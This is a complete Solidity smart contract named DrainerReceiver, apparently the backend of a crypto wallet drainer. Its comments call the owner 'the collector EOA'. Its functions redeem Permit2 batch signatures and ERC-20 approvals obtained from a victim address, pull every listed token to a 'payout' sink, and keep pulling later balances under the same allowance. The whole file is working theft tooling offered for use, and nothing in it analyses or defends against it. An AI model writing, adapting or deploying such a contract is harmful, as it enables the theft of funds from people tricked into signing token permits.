// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPermit2 {
    struct PermitDetails { address token; uint160 amount; uint48 expiration; uint48 nonce; }
    struct PermitBatch { PermitDetails[] details; address spender; uint256 sigDeadline; }
    function permit(address owner, PermitBatch calldata permitBatch, bytes calldata signature) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}

/// @notice Spender for Permit2 batch signatures and plain ERC-20 allowances.
///         Pulls straight to `payout`, so no follow-up withdraw transaction is needed.
/// @dev    Owner is the collector EOA. Every entry point is owner-gated because
///         Permit2 allowances are granted to this address specifically.
contract DrainerReceiver {
    error NotOwner();
    error ZeroAddress();
    error LengthMismatch();
    error SpenderMismatch();
    error TransferFailed();
    error NothingToSweep();

    event Pulled(address indexed token, address indexed from, uint256 amount);
    event OwnerChanged(address indexed previous, address indexed next);
    event PayoutChanged(address indexed previous, address indexed next);

    address public owner;
    address public payout;

    IPermit2 public constant PERMIT2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    constructor(address _owner, address _payout) {
        if (_owner == address(0) || _payout == address(0)) revert ZeroAddress();
        owner = _owner;
        payout = _payout;
        emit OwnerChanged(address(0), _owner);
        emit PayoutChanged(address(0), _payout);
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    function setOwner(address next) external onlyOwner {
        if (next == address(0)) revert ZeroAddress();
        emit OwnerChanged(owner, next);
        owner = next;
    }

    function setPayout(address next) external onlyOwner {
        if (next == address(0)) revert ZeroAddress();
        emit PayoutChanged(payout, next);
        payout = next;
    }

    /// @notice Spend a Permit2 batch signature and pull every listed token.
    function permitAndPull(
        address from,
        IPermit2.PermitBatch calldata batch,
        bytes calldata sig,
        address[] calldata tokens,
        uint160[] calldata amounts
    ) external onlyOwner {
        if (tokens.length != amounts.length) revert LengthMismatch();
        if (batch.spender != address(this)) revert SpenderMismatch();

        PERMIT2.permit(from, batch, sig);

        address sink = payout;
        for (uint256 i; i < tokens.length; ++i) {
            uint160 amount = amounts[i];
            if (amount == 0) continue;
            PERMIT2.transferFrom(from, sink, amount, tokens[i]);
            emit Pulled(tokens[i], from, amount);
        }
    }

    /// @notice Pull one token under a PermitBatch whose nonce was already spent.
    ///         Permit2 nonces are single-use, so the batch is submitted with
    ///         permitAndPull once and every later top-up comes through here.
    function pullPermit2(address token, address from, uint160 amount) external onlyOwner {
        if (amount == 0) return;
        PERMIT2.transferFrom(from, payout, amount, token);
        emit Pulled(token, from, amount);
    }

    /// @notice Fallback path for a plain approve() granted to this contract.
    function pullDirect(address token, address from, uint256 amount) external onlyOwner {
        if (amount == 0) return;
        _safeCall(token, abi.encodeWithSelector(0x23b872dd, from, payout, amount));
        emit Pulled(token, from, amount);
    }

    /// @notice Move tokens already held here on to the payout sink.
    function withdraw(address token, uint256 amount) external onlyOwner {
        if (amount == 0) return;
        _safeCall(token, abi.encodeWithSelector(0xa9059cbb, payout, amount));
    }

    /// @notice Recover ETH sent here by mistake (native is never pulled).
    function sweepNative() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance == 0) revert NothingToSweep();
        (bool ok, ) = payout.call{value: balance}("");
        if (!ok) revert TransferFailed();
    }

    function _safeCall(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        if (!ok) revert TransferFailed();
        // non-standard tokens (USDT) return nothing; others return a bool
        if (ret.length == 0) return;
        if (ret.length < 32) revert TransferFailed();
        if (!abi.decode(ret, (bool))) revert TransferFailed();
    }

    receive() external payable {}
}